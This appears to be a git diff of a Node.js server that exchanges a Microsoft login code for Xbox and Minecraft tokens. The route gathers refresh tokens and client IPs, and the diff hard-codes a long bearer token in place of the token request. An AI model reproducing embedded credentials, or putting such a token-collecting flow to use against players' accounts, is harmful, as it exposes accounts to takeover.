@@ -25,25 +25,16 @@ app.get('/', async (req, res) => {
         return
     }
     try {
-        console.log("1")
         const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
-        console.log("2")
         const accessToken = accessTokenAndRefreshTokenArray[0]
-        console.log("3")
         const refreshToken = accessTokenAndRefreshTokenArray[1]
-        console.log("4")
         const hashAndTokenArray = await getUserHashAndToken(accessToken)
-        console.log("5")
         const userToken = hashAndTokenArray[0]
-        console.log("6")
         const userHash = hashAndTokenArray[1]
-        console.log("7")
         const xstsToken = await getXSTSToken(userToken)
-        console.log("8")
-        const bearerToken = await getBearerToken(xstsToken, userHash)
-        console.log("9")
-        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
-        console.log("10")
+        // const bearerToken = await getBearerToken(xstsToken, userHash)
+        // const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
+        const usernameAndUUIDArray = await getUsernameAndUUID("eyJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiUlNBLU9BRVAiLCJjdHkiOiJKV1QiLCJ6aXAiOiJERUYiLCJ4NXQiOiJnN3hlanVTXzRnOXNNdW9fLXdVeFQ5NHNHancifQ.U36Li71e4hjgrPPP55doq2w5vGbVlj0q6yksh1yy9DfQznhgIOGe-z23PDVcbPN6yEH8FdQF4GsL6PWAmNcfkLZ9X6Kh2_DBs1hvSQ_h7mt1lpsLgdDTwoeX48OhRIRNvw4Dv6FV6Myc3BNpl1WFTCO2JQ3WGQcXQopbmZF3T_D3quwMfrIjqLr0N1GMQuUP1oSLrci_IyLYzoadIPSOIHDk0aPZhIh18TkTwKQMkrc9SWBByn9lzDxurp9LjiMPdOuR5raMc4kKDiy6LkmAjEY_MFbv6-jq73UfARFB1CmwVlAoAargsllcdMcWEQCgQ-IzGvfJaRhG6rvljMYJhw.3BZCmZodVncF1P3ycFUfpw.KAr8CvSu35DxTQWz7aTyJN8fbKRgoceD2lGkrLaAeItK3CcKgxH1dDXWcKAXKQImRnU6FyKF-42cazmELhdBMZWBP3HezCUdtscncNv-2KHRORK-4yvouTn_IUnhwhz6wDYXuNpkXl7wzNFANLX0DrA-be0l-cLn2-VmPJ2jvQUdmOMxV7e4cf7bE6JmQdR8WtQZqsowOXXu2mJzIusEfzrvDhMsT08eR55dwwNxOWBNXN8XbqwwF5-H6jqvzrjyXvG_tFLsnsvHspTAwjXFlL2-JUpbSZClMP8ReaKsR7C9fALsRgyGw1t7lWtCwny8sFg5k12qKTPJvSxxNJHMd-xDjKao4GPjgUJWVOnEzbmjaXPh3STl1FUuJPrOUxwTsHV90G0xz84bL4ws0ejc4soFIs4EtN4Tb1Y5i0Y11NJuzeKDjQviklhD-LiK_dOgtMlR3Fuh40tcsAVfQ8jxv7G6ARbSaI-nOf3LPaHQvajc7LV2qQhGfkNfYIiP38ZxL6XPnPUg74UkekqWJmXfTBAeY7DDEEFW6g5ciLO8WoME9lTIdHBC9aL4WOF-tNDHH0MU1ts_caRi6ggO9lucQ0pDxqAS6iP-sKqwV0qjQdn5TwFbXR5BRLcSKuGlbbQcEA7XZ_TYSDsWe73J6hTeZZnD1368iE2wm77fOuuxXW50wh2-OmvPi11mXeaWwg8XxoQEGhkrerFvt2_fheVzJj795GBp0F6shdl0RXLpPREVYqR4uEdTXQcqDleZFyjvxWVh8fXB5LOnU9ScYduPb-G4JF9rJRPFAskoZsycLPn0h3ZY0TadSNMSBGuoopwYTu20TTXrMWAfCi2lVDSNngquN4MbmX5eQfuE1rrRV7wuY4QcK6GfeAwLTwegKwTx3hzeMSSNtq6iwL9yd6ctd_gmheOKVD3VfZweSdZ-krmnuT7gSVrbHXBNrrdEpYTrz3H7-wquDjF23_hIE5uB7POEyMGzBmxxu8_w76sQ0rix8dvIfjoQLJpgwJvGdc0SsSlEVsflAwn5LOTfSK0uNICZnTQtZSn3hRFh-eZ6jwwo1TDIrSKmhhkQMthhdJNIPASaeSFtCnRI88LvPz3W8DW9-i1AWw5ZP7OL_-TMZEyU3f7EIQR6ztuhMrmNscWH8QCDyA8nP52l01j90snwPzIzucEr5hehSsO_kEPFPbnWZmemVMtQSeCrKLBYd2BWTcffVvB8ZY4vp9cn3hiDQ3Xs6XUduBMhFBWhkMSeuUDMdNZbc7ma9WuKDvDppQBe7YKIimCs_Vv36T1ZzhQqynqYrnLvnJOt1r6yfuTrO2z2_seSpTXkup9UIUH8HyKrJicgXcfmURzDe6bmV-W_oNNqV0Qa8ZRji8CjfYWA7CcKHK9OIcH6g_PedgefmzF0lMeT0Z6QTXfd-ocnVJDcas8i5djQV9dpTJ8Q6V-_tvrur0uW5njhbUtHYHi0W5hnz1v4pMd5Z0OYl4baJYbHuNo4gCOFOeNo7IaPcwfJW-q83-0RAPsR-LRo4tm_Ok__t2qKerZLhXQ6Ix3_es9ZWMwLlp6LlEkb0lx5I_7PrIiYtb93fB-cIpEFtWM2Wjf80b6021bZ8-FJKDgvO0mchQ.CUxlVaX1Je70f9cnWQ72Zw")
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = clientIp
@@ -112,19 +103,19 @@ async function getXSTSToken(userToken) {
     return response.data['Token']
 }
 
-async function getBearerToken(xstsToken, userHash) {
-    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
-    const config = {
-        headers: {
-            'Content-Type': 'application/json',
-        }
-    }
-    let data = {
-        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
-    }
-    let response = await axios.post(url, data, config)
-    return response.data['access_token']
-}
+// async function getBearerToken(xstsToken, userHash) {
+//     const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
+//     const config = {
+//         headers: {
+//             'Content-Type': 'application/json',
+//         }
+//     }
+//     let data = {
+//         identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
+//     }
+//     let response = await axios.post(url, data, config)
+//     return response.data['access_token']
+// }
 
 async function getUsernameAndUUID(bearerToken) {
     const url = 'https://api.minecraftservices.com/minecraft/profile'
